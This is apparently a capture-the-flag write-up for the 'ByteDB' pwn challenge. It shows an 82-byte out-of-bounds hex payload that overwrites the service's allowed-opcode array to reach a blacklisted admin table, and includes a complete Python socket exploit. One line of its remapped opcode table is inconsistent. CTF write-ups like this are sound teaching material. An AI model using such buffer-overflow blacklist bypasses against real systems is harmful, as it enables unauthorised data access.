# ByteDB — English

**Category:** Exploitation (pwn / web-ish TCP service). **Points:** 1000.
**Target:** `nc challs.crate.nu 30261`
**Flag format:** `cratectf{...}` (literal value redacted below — you recover it yourself).

> Note: the team's own solve was pre-empted by another team's earlier submission
> on the scoreboard, but the technique below is the confirmed working solution and
> reproduces the admin note containing the flag.

## 1. What the service does

Connect and you get a text menu. Three things matter:

* **Option `1` — run a query.** You type a list of opcodes in hex (spaces optional),
  terminated by `0xFF`. The server decodes the hex into a fixed **64-byte "database
  buffer"**, translates the opcodes into an SQL-like statement, and runs it.
  Help text shown on any parse error:
  ```
  --Write valid bytecodes in hex format, and end query with 0xFF.
  --You are not authorized to use 0x11.
  --Example: 00 20 01 10 FF or 00200110FF.
  ```
* **Option `2` — "Inspect ByteDB mappings".** Dumps the full opcode→token table.

### The complete opcode table (menu option `2`)

```
0x00: SELECT      0x10: data        0x20: username    0x30: admin
0x01: FROM        0x11: admin_data  0x21: id          0x31: user
0x02: WHERE       0x23: notes       0x22: role        0x41: knut
0x03: ==          0x04: ,           0x42: berit       0x43: arne
0x44: ingvar      0xFF: END
```

In canonical order the 18 tokens are:

```
SELECT, FROM, WHERE, ==, ',', data, admin_data, username, id, role,
notes, admin, user, knut, berit, arne, ingvar, END
```

These 18 tokens are paired, by index, with an **"allowed-key array"** of 18 opcode
bytes held in memory *immediately after* the 64-byte database buffer. In the normal
(unmodified) state that key array is the sorted list:

```
00 01 02 03 04 10 11 20 21 22 23 30 31 41 42 43 44 FF
```

so index 0 (`SELECT`) ↔ `0x00`, … index 6 (`admin_data`) ↔ `0x11`, … exactly as the
menu dump shows.

### Normal query (baseline)

```
Option 1, send:  00 23 01 10 FF
-> Bytecode translates to: SELECT notes FROM data;
```
(`00`=SELECT, `23`=notes, `01`=FROM, `10`=data, `FF`=END.)

## 2. The vulnerability

* The `admin_data` token sits at key byte `0x11`. Input validation **blacklists
  `0x11`**: any query that contains the byte `0x11` (at any position) is rejected
  before execution. The "You are not authorized to use 0x11" line is static help
  text printed on *every* parse failure (even on pure non-hex garbage), i.e. there
  is no separate semantic auth check to bypass — `0x11` is simply never accepted.
* The hex decoder has **no bounds check** protecting the 64-byte database buffer. It
  will decode up to **82 bytes** of input straight past the end of that buffer. The
  18-byte allowed-key array lives directly after the buffer, at decoded offsets
  **64–81**. Therefore an 82-byte query overwrites **all 18 key bytes** with
  attacker-chosen values.
* The overwrite happens *before* the "SQL statement length invalid" rejection, so the
  key array is modified even though that query is not executed. The corruption is
  per-connection and persists for follow-up queries on the **same TCP connection**.

Key idea: you never need to send `0x11`. Instead, **rewrite the key array** so that
the `admin_data` token (canonical index 6) becomes reachable through an
always-allowed opcode byte.

## 3. Building the overwrite

Choose a new 18-byte key array that is the original set **minus `0x11`**, keeping it
sorted and keeping every opcode the validator still needs. Dropping `0x11` leaves 17
distinct bytes, so duplicate the last ordinary one (`0x44`) to refill 18 slots:

```
new keys = 00 01 02 03 04 10 20 21 22 23 30 31 41 42 43 44 44 FF
```

Pairing these by index with the fixed token list yields the **new mapping**:

```
00=SELECT  01=FROM  02=WHERE  03===  04=','  10=data
20=admin_data   21=username  22=role  23=role... 30=notes  31=admin
41=user  42=knut  43=berit  44=arne  44=ingvar  FF=END
```

The only facts you need from that are:

```
00 = SELECT     01 = FROM     20 = admin_data     30 = notes     FF = END
```

So after the rewrite, the query `00 30 01 20 FF` means **`SELECT notes FROM
admin_data;`** — and every byte in it (`00 30 01 20 FF`) is in the allowed set under
both the old and the new key array. `0x11` is never sent.

### The 82-byte payload

```
head (64 bytes) : 00 30 01 20   + 04 repeated 60 times
keys (18 bytes) : 00 01 02 03 04 10 20 21 22 23 30 31 41 42 43 44 44 FF
```

As one compact hex string (164 hex chars = 82 bytes):

```
00300120 0404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404 0001020304102021222330314142434444FF
```

The 64-byte head content is irrelevant (the query is not executed) — it only exists
to push the write cursor to offset 64 so the trailing 18 bytes land on the key array.

## 4. Full exploit (single TCP connection)

All three steps must happen on **one** connection, because the corruption is
per-connection.

```python
import socket, time

HOST, PORT = "challs.crate.nu", 30261

def rd(s, wait=0.5, timeout=1.5):
    time.sleep(wait); s.settimeout(timeout); out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    return out.decode(errors="replace")

s = socket.create_connection((HOST, PORT), timeout=10)
print(rd(s, 0.8))                                   # banner / menu

# Step 1: overwrite the key array (option 1 + 82-byte payload)
head = "00300120" + "04" * 60                        # 64 bytes
keys = "0001020304102021222330314142434444FF"        # 18 bytes
payload = head + keys
assert len(payload) == 164                            # 82 bytes

s.sendall(b"1\n"); rd(s, 0.4)
s.sendall((payload + "\n").encode())
print(rd(s, 1.0))   # -> "Wrote 82 bytes to the database buffer" + "SQL statement length invalid"

# Step 2 (optional proof): dump mapping, now shows 0x20: admin_data
s.sendall(b"\n"); rd(s, 0.3)        # empty input returns to menu
s.sendall(b"2\n")
print(rd(s, 0.8))                   # mapping dump: "0x20: admin_data"

# Step 3: run the remapped admin query on the SAME connection
s.sendall(b"\n"); rd(s, 0.3)
s.sendall(b"1\n"); rd(s, 0.4)
s.sendall(b"00300120FF\n")
print(rd(s, 1.0))   # -> SELECT notes FROM admin_data;  -> admin note with the flag
```

### What each response shows

1. **Step 1 response** contains `Wrote 82 bytes to the database buffer` (the
   out-of-bounds write succeeded) followed by `SQL statement length invalid` (that
   query is not run — but the key array is already corrupted).
2. **Step 2 mapping dump** now shows `0x20: admin_data` (and the other tokens shifted
   up one opcode slot), confirming the remap.
3. **Step 3 response** shows `Bytecode translates to: SELECT notes FROM admin_data;`
   and prints the admin note. The note's text is the flag, `cratectf{...}`.

## 5. Why shorter overflows failed

Partial overflows (e.g. 65 or 71 bytes) corrupt only a *prefix* of the key array and
simultaneously drop opcodes the validator still needs (e.g. `0x00`), so every
subsequent query on that connection returns `Invalid format` — the connection reads
as "poisoned". The working approach is a **full 82-byte rewrite** that (a) keeps
every needed opcode present, (b) keeps the array sorted, and (c) is followed by a
query whose bytes are valid under both the old and new key sets.

## Verification

Platform-confirmed solved. The remapped query returns `SELECT notes FROM
admin_data;` and the admin note, which is the flag in `cratectf{...}` format.
`0x11` is never transmitted — authorization is bypassed purely by relocating the
`admin_data` token onto an always-allowed opcode via the out-of-bounds key-array
overwrite.
